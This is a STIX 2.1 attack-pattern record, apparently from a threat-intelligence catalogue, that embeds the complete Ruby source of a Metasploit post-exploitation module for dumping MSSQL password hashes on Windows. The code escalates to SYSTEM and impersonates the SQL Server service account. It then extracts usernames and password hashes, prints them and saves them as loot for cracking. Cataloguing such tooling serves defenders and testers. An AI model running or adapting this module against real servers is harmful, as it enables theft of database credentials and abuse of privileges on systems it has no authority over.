{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4fe18db-4202-4e33-bde3-30d55ed0d94a",
    "created": "2024-08-14T16:33:08.246977Z",
    "modified": "2024-08-14T16:33:08.246981Z",
    "name": "Windows Gather Local SQL Server Hash Dump",
    "description": " This module extracts the usernames and password hashes from an MSSQL server and stores them as loot. It uses the same technique in mssql_local_auth_bypass.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/mssql_local_hashdump.rb",
            "external_id": "mssql_local_hashdump.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.dionach.com/blog/easily-grabbing-microsoft-sql-server-password-hashes"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::MSSQL\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Local SQL Server Hash Dump',\n        'Description' => %q{\n          This module extracts the usernames and password\n          hashes from an MSSQL server and stores them as loot. It uses the\n          same technique in mssql_local_auth_bypass.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Mike Manzotti <mike.manzotti[at]dionach.com>',\n          'nullbind' # Original technique\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'https://www.dionach.com/blog/easily-grabbing-microsoft-sql-server-password-hashes']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_rev2self\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('INSTANCE', [false, 'Name of target SQL Server instance', nil])\n      ]\n    )\n  end\n\n  def run\n    # Set instance name (if specified)\n    instance = datastore['INSTANCE'].to_s\n\n    # Display target\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    # Identify available native SQL client\n    get_sql_client\n    fail_with(Failure::Unknown, 'Unable to identify a SQL client') unless @sql_client\n\n    # Get LocalSystem privileges\n    system_status = get_system\n    fail_with(Failure::Unknown, 'Unable to get SYSTEM') unless system_status\n\n    begin\n      service = check_for_sqlserver(instance)\n      fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service\n\n      print_status(\"Identified service '#{service[:display]}', PID: #{service[:pid]}\")\n      instance_name = service[:display].gsub('SQL Server (', '').gsub(')', '').strip\n\n      begin\n        get_sql_hash(instance_name)\n      rescue RuntimeError\n        # Attempt to impersonate sql server service account (for sql server 2012)\n        if impersonate_sql_user(service)\n          get_sql_hash(instance_name)\n        end\n      end\n    ensure\n      # return to original priv context\n      session.sys.config.revert_to_self\n    end\n  end\n\n  def get_sql_version(instance_name)\n    vprint_status('Attempting to get version...')\n\n    query = mssql_sql_info\n\n    get_version_result = run_sql(query, instance_name)\n\n    # Parse Data\n    get_version_array = get_version_result.split(\"\\n\")\n    version_year = get_version_array.first.strip.slice(/\\d\\d\\d\\d/)\n    if version_year\n      vprint_status(\"MSSQL version found: #{version_year}\")\n      return version_year\n    else\n      vprint_error('MSSQL version not found')\n    end\n  end\n\n  def get_sql_hash(instance_name)\n    version_year = get_sql_version(instance_name)\n\n    case version_year\n    when '2000'\n      hash_type = 'mssql'\n      query = mssql_2k_password_hashes\n    when '2005', '2008'\n      hash_type = 'mssql05'\n      query = mssql_2k5_password_hashes\n    when '2012', '2014'\n      hash_type = 'mssql12'\n      query = mssql_2k5_password_hashes\n    else\n      fail_with(Failure::Unknown, 'Unable to determine MSSQL Version')\n    end\n\n    print_status('Attempting to get password hashes...')\n\n    res = run_sql(query, instance_name)\n\n    if res.include?('0x')\n      # Parse Data\n      if hash_type == 'mssql12'\n        res = res.unpack('H*')[0].gsub('200d0a', '_CRLF_').gsub('0d0a', '').gsub('_CRLF_', '0d0a').gsub(/../) do |pair|\n          pair.hex.chr\n        end\n      end\n      hash_array = res.split(\"\\r\\n\").grep(/0x/)\n\n      store_hashes(hash_array, hash_type)\n    else\n      fail_with(Failure::Unknown, 'Unable to retrieve hashes')\n    end\n  end\n\n  def store_hashes(hash_array, hash_type)\n    # Save data\n    loot_hashes = ''\n    hash_array.each do |row|\n      user, hash = row.strip.split\n\n      service_data = {\n        address: rhost,\n        port: rport,\n        service_name: 'mssql',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      # Initialize Metasploit::Credential::Core object\n      credential_data = {\n        post_reference_name: refname,\n        origin_type: :session,\n        private_type: :nonreplayable_hash,\n        private_data: hash,\n        username: user,\n        session_id: session_db_id,\n        jtr_format: hash_type,\n        workspace_id: myworkspace_id\n      }\n\n      credential_data.merge!(service_data)\n\n      # Create the Metasploit::Credential::Core object\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      # Merge in the service data and create our Login\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n      print_line(\"#{user}:#{hash}\")\n\n      loot_hashes << \"#{user}:#{hash}\\n\"\n    end\n\n    if loot_hashes.empty?\n      return false\n    else\n      # Store MSSQL password hash as loot\n      loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')\n      print_good(\"MSSQL password hash saved in: #{loot_path}\")\n      return true\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}